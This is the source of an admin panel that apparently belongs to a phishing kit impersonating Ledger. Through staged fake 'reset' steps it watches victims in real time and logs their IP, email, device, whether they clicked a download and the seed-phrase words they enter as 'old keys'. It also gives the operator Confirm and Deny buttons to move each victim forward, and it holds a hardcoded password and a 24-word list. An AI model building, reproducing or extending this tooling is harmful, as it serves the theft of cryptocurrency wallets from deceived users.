"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Lock, RefreshCw, Users, CheckCircle2, XCircle, Clock, Download, Key, Smartphone, Monitor, Usb, Send, Timer, Trash2 } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"


const ADMIN_PASSWORD = "Diddy123"

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [activities, setActivities] = useState<UserActivity[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [, setTick] = useState(0)

  // Update timer every second
  useEffect(() => {
    const interval = setInterval(() => setTick((t) => t + 1), 1000)
    return () => clearInterval(interval)
  }, [])

  const handleLogin = () => {
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true)
      setError("")
    } else {
      setError("Incorrect password")
    }
  }

  // Auto-refresh every 2 seconds when authenticated
  useEffect(() => {
    if (!isAuthenticated) return

    fetchActivities()
    const interval = setInterval(fetchActivities, 1000)
    
    return () => clearInterval(interval)
  }, [isAuthenticated])

  const fetchActivities = async () => {
    setIsLoading(true)
    try {
      const res = await fetch("/api/activity?all=true")
      const data = await res.json()
      setActivities(data.activities || [])
    } catch {
      console.error("Failed to fetch activities")
    }
    setIsLoading(false)
  }

  const getStageLabel = (stage: string) => {
    switch (stage) {
      case "intake":
        return "Intake - Email Stage"
      case "approval":
        return "Stage 1 - Approval"
      case "connect-ledger":
        return "Stage 2 - Connect Ledger"
      case "confirm-reset":
        return "Stage 3 - Confirm Reset"
      case "reset-api-keys":
        return "Stage 4 - Reset API Keys"
      case "verify-words":
        return "Stage 5 - Verify Words"
      case "enter-old-keys":
        return "Stage 6 - Enter Old Keys"
      case "completed":
        return "Completed"
      default:
        return stage
    }
  }

  const getStageColor = (stage: string) => {
    switch (stage) {
      case "intake":
        return "bg-cyan-500/20 text-cyan-400 border-cyan-500/30"
      case "approval":
        return "bg-warning/20 text-warning border-warning/30"
      case "connect-ledger":
        return "bg-purple-500/20 text-purple-400 border-purple-500/30"
      case "confirm-reset":
        return "bg-orange-500/20 text-orange-400 border-orange-500/30"
      case "reset-api-keys":
        return "bg-blue-500/20 text-blue-400 border-blue-500/30"
      case "verify-words":
        return "bg-pink-500/20 text-pink-400 border-pink-500/30"
      case "enter-old-keys":
        return "bg-amber-500/20 text-amber-400 border-amber-500/30"
      case "completed":
        return "bg-success/20 text-success border-success/30"
      default:
        return "bg-muted text-muted-foreground"
    }
  }

  const getActionIcon = (action: string) => {
    switch (action) {
      case "approved":
        return <CheckCircle2 className="w-3 h-3 text-success" />
      case "denied":
        return <XCircle className="w-3 h-3 text-destructive" />
      default:
        return <Clock className="w-3 h-3 text-warning" />
    }
  }

  const formatSessionDuration = (startTime: string) => {
    const start = new Date(startTime).getTime()
    const now = Date.now()
    const diff = Math.floor((now - start) / 1000)
    
    const hours = Math.floor(diff / 3600)
    const minutes = Math.floor((diff % 3600) / 60)
    const seconds = diff % 60
    
    if (hours > 0) {
      return `${hours}h ${minutes}m ${seconds}s`
    } else if (minutes > 0) {
      return `${minutes}m ${seconds}s`
    }
    return `${seconds}s`
  }

  const getDeviceInfo = (userAgent: string) => {
    const ua = userAgent.toLowerCase()
    const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|windows phone|webos/i.test(ua)
    
    if (isMobile) {
      if (/iphone/i.test(ua)) return { type: "Phone", name: "iPhone", icon: Smartphone }
      if (/ipad/i.test(ua)) return { type: "Tablet", name: "iPad", icon: Smartphone }
      if (/android/i.test(ua) && /mobile/i.test(ua)) return { type: "Phone", name: "Android Phone", icon: Smartphone }
      if (/android/i.test(ua)) return { type: "Tablet", name: "Android Tablet", icon: Smartphone }
      return { type: "Phone", name: "Mobile Device", icon: Smartphone }
    }
    
    if (/windows/i.test(ua)) return { type: "Computer", name: "Windows PC", icon: Monitor }
    if (/macintosh|mac os/i.test(ua)) return { type: "Computer", name: "Mac", icon: Monitor }
    if (/linux/i.test(ua)) return { type: "Computer", name: "Linux PC", icon: Monitor }
    
    return { type: "Computer", name: "Desktop", icon: Monitor }
  }

  const handleRemoveSession = async (visitorId: string) => {
    await fetch("/api/activity", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId }),
    })
    fetchActivities()
  }

  const handleConfirmUser = async (visitorId: string) => {
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    
    if (data.activity) {
      const activity: UserActivity = {
        ...data.activity,
        stage2Data: {
          ...data.activity.stage2Data,
          adminConfirmed: true,
        },
        lastUpdated: new Date().toISOString(),
      }
      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, activity }),
      })
      fetchActivities()
    }
  }

  const handleConfirmOldKeys = async (visitorId: string) => {
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    
    if (data.activity) {
      const activity: UserActivity = {
        ...data.activity,
        oldKeysData: {
          ...data.activity.oldKeysData,
          adminConfirmed: true,
        },
        lastUpdated: new Date().toISOString(),
      }
      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, activity }),
      })
      fetchActivities()
    }
  }

  const handleDenyOldKeys = async (visitorId: string) => {
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    
    if (data.activity) {
      const activity: UserActivity = {
        ...data.activity,
        oldKeysData: {
          ...data.activity.oldKeysData,
          adminDenied: true,
        },
        lastUpdated: new Date().toISOString(),
      }
      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, activity }),
      })
      fetchActivities()
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-card border-border">
          <CardHeader className="text-center">
            <div className="mx-auto w-12 h-12 bg-secondary rounded-full flex items-center justify-center mb-4">
              <Lock className="w-6 h-6 text-muted-foreground" />
            </div>
            <CardTitle className="text-foreground">Admin Panel</CardTitle>
            <p className="text-sm text-muted-foreground mt-2">Enter password to access the admin panel</p>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                className="bg-secondary border-border"
              />
              {error && <p className="text-sm text-destructive">{error}</p>}
            </div>
            <Button
              onClick={handleLogin}
              className="w-full bg-foreground text-background hover:bg-foreground/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
            >
              Login
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center gap-4">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
              <Badge variant="outline" className="text-xs bg-secondary">Admin</Badge>
            </div>
            <Button
              variant="outline"
              size="sm"
              onClick={fetchActivities}
              disabled={isLoading}
              className="bg-transparent border-border cursor-pointer"
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${isLoading ? "animate-spin" : ""}`} />
              Refresh
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="flex items-center gap-3 mb-6">
          <Users className="w-5 h-5 text-muted-foreground" />
          <h1 className="text-xl sm:text-2xl font-semibold text-foreground">User Activity</h1>
          <Badge variant="secondary" className="ml-auto">{activities.length} visitors</Badge>
        </div>

        {activities.length === 0 ? (
          <Card className="bg-card border-border">
            <CardContent className="py-12 text-center">
              <p className="text-muted-foreground">No user activity recorded yet</p>
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-4">
            {activities.map((activity) => (
              <Card key={activity.visitorId} className="bg-card border-border">
                <CardHeader className="pb-3">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="space-y-1">
                      <CardTitle className="text-base font-medium text-foreground">
                          {activity.visitorId.substring(0, 20)}...
                        </CardTitle>
                      <p className="text-sm text-muted-foreground font-mono">
                        IP: {activity.ipAddress}
                      </p>
                      {activity.email && (
                        <p className="text-sm text-muted-foreground">
                          Email: <span className="text-foreground">{activity.email}</span>
                        </p>
                      )}
                      {activity.caseId && (
                        <p className="text-sm text-muted-foreground">
                          Case ID: <span className="text-foreground">{activity.caseId}</span>
                        </p>
                      )}
                      {(() => {
                        const device = getDeviceInfo(activity.userAgent)
                        const DeviceIcon = device.icon
                        return (
                          <div className="flex items-center gap-2 mt-1">
                            <DeviceIcon className={`w-4 h-4 ${device.type === "Phone" || device.type === "Tablet" ? "text-blue-400" : "text-green-400"}`} />
                            <span className="text-xs text-muted-foreground">{device.name}</span>
                          </div>
                        )
                      })()}
                    </div>
                    <div className="flex flex-col items-end gap-2">
                      {(() => {
                        const device = getDeviceInfo(activity.userAgent)
                        return (
                          <Badge 
                            variant="outline" 
                            className={device.type === "Phone" || device.type === "Tablet" 
                              ? "bg-blue-500/10 text-blue-400 border-blue-500/30" 
                              : "bg-green-500/10 text-green-400 border-green-500/30"
                            }
                          >
                            {device.type}
                          </Badge>
                        )
                      })()}
                      <Badge variant="outline" className={getStageColor(activity.currentStage)}>
                        {getStageLabel(activity.currentStage)}
                      </Badge>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleRemoveSession(activity.visitorId)}
                        className="bg-transparent border-destructive/30 text-destructive hover:bg-destructive hover:text-destructive-foreground cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                      >
                        <Trash2 className="w-3 h-3 mr-1" />
                        Remove
                      </Button>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="pt-0">
                  <div className="space-y-3">
                    <div className="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4">
                      <p className="text-xs text-muted-foreground">
                        Last updated: {new Date(activity.lastUpdated).toLocaleString()}
                      </p>
                      {activity.sessionStarted && (
                        <div className="flex items-center gap-1.5 text-xs bg-secondary/50 rounded-md px-2 py-1 w-fit">
                          <Timer className="w-3 h-3 text-muted-foreground" />
                          <span className="text-muted-foreground">Session:</span>
                          <span className="text-foreground font-mono">{formatSessionDuration(activity.sessionStarted)}</span>
                        </div>
                      )}
                    </div>
                    
                    <div className="border-t border-border pt-3">
                      <p className="text-xs text-muted-foreground mb-2">Decisions:</p>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                        {activity.decisions.map((decision) => (
                          <div
                            key={decision.requestId}
                            className="flex items-center gap-2 text-sm bg-secondary/50 rounded-md px-3 py-2"
                          >
                            {getActionIcon(decision.action)}
                            <span className="text-foreground truncate flex-1">{decision.requestName}</span>
                            <Badge
                              variant="outline"
                              className={
                                decision.action === "approved"
                                  ? "bg-success/10 text-success border-success/30 text-xs"
                                  : decision.action === "denied"
                                  ? "bg-destructive/10 text-destructive border-destructive/30 text-xs"
                                  : "bg-warning/10 text-warning border-warning/30 text-xs"
                              }
                            >
                              {decision.action}
                            </Badge>
                          </div>
                        ))}
                      </div>
                    </div>

                    {activity.stage2Data && (
                      <div className="border-t border-border pt-3">
                        <p className="text-xs text-muted-foreground mb-2">Stage 2 - Connect Ledger:</p>
                        <div className="flex items-center gap-3 bg-secondary/50 rounded-md px-3 py-3">
                          <Usb className="w-5 h-5 text-purple-400" />
                          <div className="flex-1">
                            <p className="text-sm text-foreground">
                              {activity.stage2Data?.waitingForAdmin 
                                ? "User is waiting for confirmation" 
                                : "User has not clicked Next yet"}
                            </p>
                            <p className="text-xs text-muted-foreground">
                              {activity.stage2Data?.adminConfirmed 
                                ? "Confirmed - User will proceed" 
                                : activity.stage2Data?.waitingForAdmin 
                                  ? "Waiting for admin approval"
                                  : "Not waiting"}
                            </p>
                          </div>
                          {activity.stage2Data?.waitingForAdmin && !activity.stage2Data?.adminConfirmed && (
                            <Button
                              size="sm"
                              onClick={() => handleConfirmUser(activity.visitorId)}
                              className="bg-success text-success-foreground hover:bg-success/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                            >
                              <Send className="w-4 h-4 mr-1" />
                              Confirm
                            </Button>
                          )}
                          {activity.stage2Data?.adminConfirmed && (
                            <Badge variant="outline" className="bg-success/10 text-success border-success/30">
                              Confirmed
                            </Badge>
                          )}
                        </div>
                      </div>
                    )}

                    {activity.stage3Data && (
                      <div className="border-t border-border pt-3">
                        <p className="text-xs text-muted-foreground mb-2">Stage 4 - API Key Reset:</p>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                          <div className="flex items-center gap-2 text-sm bg-secondary/50 rounded-md px-3 py-2">
                            <Key className="w-3 h-3 text-muted-foreground" />
                            <span className="text-muted-foreground">Selected Key:</span>
                            <Badge variant="outline" className="bg-blue-500/10 text-blue-400 border-blue-500/30 text-xs">
                              {activity.stage3Data?.selectedApiKey || "None selected"}
                            </Badge>
                          </div>
                          <div className="flex items-center gap-2 text-sm bg-secondary/50 rounded-md px-3 py-2">
                            <Download className="w-3 h-3 text-muted-foreground" />
                            <span className="text-muted-foreground">Download:</span>
                            <Badge 
                              variant="outline" 
                              className={activity.stage3Data?.downloadClicked 
                                ? "bg-success/10 text-success border-success/30 text-xs" 
                                : "bg-warning/10 text-warning border-warning/30 text-xs"
                              }
                            >
                              {activity.stage3Data?.downloadClicked ? "Clicked" : "Not clicked"}
                            </Badge>
                          </div>
                        </div>
                        {activity.stage3Data?.downloadTimestamp && (
                          <p className="text-xs text-muted-foreground mt-2">
                            Downloaded at: {new Date(activity.stage3Data.downloadTimestamp).toLocaleString()}
                          </p>
                        )}
                      </div>
                    )}

                    {activity.verifyWordsData && activity.verifyWordsData.enteredWords && (
                      <div className="border-t border-border pt-3">
                        <p className="text-xs text-muted-foreground mb-2">Stage 5 - Entered Words:</p>
                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5">
                          {activity.verifyWordsData.enteredWords.map((word: string, i: number) => (
                            <div
                              key={i}
                              className={`flex items-center gap-1.5 text-xs rounded-md px-2 py-1.5 ${
                                word
                                  ? word === ["ramp","oak","walnut","crime","coast","school","bench","win","twelve","lyrics","hobby","fork","runway","great","very","goat","vapor","copper","glide","diesel","potato","sausage","property","magnet"][i]
                                    ? "bg-success/10 border border-success/30"
                                    : "bg-destructive/10 border border-destructive/30"
                                  : "bg-secondary/50 border border-border"
                              }`}
                            >
                              <span className="text-muted-foreground font-mono">{i + 1}.</span>
                              <span className={`font-mono ${
                                word
                                  ? word === ["ramp","oak","walnut","crime","coast","school","bench","win","twelve","lyrics","hobby","fork","runway","great","very","goat","vapor","copper","glide","diesel","potato","sausage","property","magnet"][i]
                                    ? "text-success"
                                    : "text-destructive"
                                  : "text-muted-foreground"
                              }`}>
                                {word || "---"}
                              </span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {activity.oldKeysData && activity.oldKeysData.enteredWords && (
                      <div className="border-t border-border pt-3">
                        <p className="text-xs text-muted-foreground mb-2">Stage 6 - Old API Keys Entered:</p>
                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5 mb-3">
                          {activity.oldKeysData.enteredWords.map((word: string, i: number) => (
                            <div
                              key={i}
                              className={`flex items-center gap-1.5 text-xs rounded-md px-2 py-1.5 ${
                                word ? "bg-amber-500/10 border border-amber-500/30" : "bg-secondary/50 border border-border"
                              }`}
                            >
                              <span className="text-muted-foreground font-mono">{i + 1}.</span>
                              <span className={`font-mono ${word ? "text-amber-400" : "text-muted-foreground"}`}>
                                {word || "---"}
                              </span>
                            </div>
                          ))}
                        </div>
                        <div className="flex items-center gap-2">
                          {activity.oldKeysData.adminConfirmed ? (
                            <Badge variant="outline" className="bg-success/10 text-success border-success/30">
                              Confirmed
                            </Badge>
                          ) : activity.oldKeysData.adminDenied ? (
                            <Badge variant="outline" className="bg-destructive/10 text-destructive border-destructive/30">
                              Denied
                            </Badge>
                          ) : (
                            <>
                              <Button
                                size="sm"
                                onClick={() => handleConfirmOldKeys(activity.visitorId)}
                                className="bg-success text-success-foreground hover:bg-success/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                              >
                                <CheckCircle2 className="w-4 h-4 mr-1" />
                                Confirm
                              </Button>
                              <Button
                                size="sm"
                                onClick={() => handleDenyOldKeys(activity.visitorId)}
                                className="bg-destructive text-destructive-foreground hover:bg-destructive/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                              >
                                <XCircle className="w-4 h-4 mr-1" />
                                Deny
                              </Button>
                            </>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="border-t border-border pt-3">
                      <p className="text-xs text-muted-foreground mb-1">User Agent:</p>
                      <p className="text-xs text-foreground/70 break-all">{activity.userAgent}</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </main>
    </div>
  )
}
